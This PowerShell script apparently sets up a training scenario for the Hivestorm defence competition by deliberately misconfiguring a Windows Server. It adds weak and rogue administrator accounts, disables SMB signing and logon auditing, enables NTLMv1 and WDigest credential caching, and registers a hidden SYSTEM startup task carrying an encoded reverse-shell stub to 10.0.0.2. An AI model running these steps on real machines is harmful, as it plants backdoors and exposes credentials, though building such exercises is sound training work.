# Hivestorm HS20 scenario-04 — Windows Server 2019 misconfigurations.
$ErrorActionPreference = "Stop"

$roles = Get-Content C:\ProgramData\sysrepair\roles.json | ConvertFrom-Json
$admin       = $roles.admin_user
$adminPw     = $roles.admin_weak_password
$rogue       = $roles.rogue_admin
$schtaskName = $roles.schtask_name
$fwPort      = $roles.rogue_firewall_port
$fwRule      = $roles.rogue_firewall_rule

# ---- users --------------------------------------------------------------------
$securePw = ConvertTo-SecureString $adminPw -AsPlainText -Force
New-LocalUser -Name $admin -Password $securePw -PasswordNeverExpires -AccountNeverExpires | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member $admin

$rogueSecure = ConvertTo-SecureString "changeme" -AsPlainText -Force
New-LocalUser -Name $rogue -Password $rogueSecure -PasswordNeverExpires -AccountNeverExpires | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member $rogue

# ---- SMB signing not required -------------------------------------------------
$lm = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
Set-ItemProperty -Path $lm -Name RequireSecuritySignature -Value 0 -Type DWord
Set-ItemProperty -Path $lm -Name EnableSecuritySignature  -Value 0 -Type DWord

# ---- LmCompatibilityLevel = 0 (NTLMv1 allowed) --------------------------------
$lsa = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
Set-ItemProperty -Path $lsa -Name LmCompatibilityLevel -Value 0 -Type DWord

# ---- WDigest credential caching enabled ---------------------------------------
$wdigest = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
New-Item -Path $wdigest -Force | Out-Null
Set-ItemProperty -Path $wdigest -Name UseLogonCredential -Value 1 -Type DWord

# ---- rogue inbound firewall rule ---------------------------------------------
New-NetFirewallRule -DisplayName $fwRule -Direction Inbound -Protocol TCP `
    -LocalPort $fwPort -Action Allow -Profile Any | Out-Null

# ---- scheduled task (SYSTEM) with encoded-command reverse shell ---------------
$payload = "`$c=New-Object Net.Sockets.TCPClient('10.0.0.2',$fwPort);" +
           "`$s=`$c.GetStream();[byte[]]`$b=0..65535|%%{0};" +
           "while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){ }"
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes($payload))
$action  = New-ScheduledTaskAction -Execute "powershell.exe" `
           -Argument "-NoProfile -EncodedCommand $encoded"
$trigger = New-ScheduledTaskTrigger -AtStartup
$princ   = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName $schtaskName -Action $action -Trigger $trigger `
    -Principal $princ -Force | Out-Null

# ---- audit policy gutted: logon success not audited ---------------------------
auditpol.exe /set /subcategory:"Logon" /success:disable /failure:disable | Out-Null

# ---- PowerShell v2 registry flag (legacy engine) ------------------------------
$ps2 = "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine"
New-Item -Path $ps2 -Force | Out-Null
Set-ItemProperty -Path $ps2 -Name PowerShellVersion -Value "2.0"
